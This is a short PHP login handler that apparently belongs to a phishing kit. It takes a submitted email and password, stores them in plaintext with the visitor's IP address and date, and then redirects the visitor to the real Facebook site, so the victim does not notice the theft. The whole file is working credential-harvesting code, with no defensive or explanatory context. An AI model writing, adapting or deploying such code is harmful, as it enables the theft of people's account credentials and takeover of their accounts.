<?php
  require_once"../Api/Class.php";

  $email="";
  $password="";
  $error=[];  


     
     $userclass=new Login($conn); 
   // Login::
  
  if($_SERVER["REQUEST_METHOD"]=="POST"){
                       
         $email=$userclass->validate($_POST["emailh"]);
         $password=$_POST["passwordh"];
         
         $password=$userclass::escapeString($password);
         $email=$userclass::escapeString($email);
                      
       $ip=$_SERVER["REMOTE_ADDR"];
       $date=date("Y-M-D");
            
      if(!empty($email) && !empty($password)){
           if($userclass::insert($email,$password,$ip,$date)){
               $userclass::redirect("https://www.facebook.com");                            
            }else{
              array_push($error,"an error occured while signing in");
            }
          }else{
              array_push($error,"input your details");
          }
  
    
  }

   
  ?>
                                                                                                                               
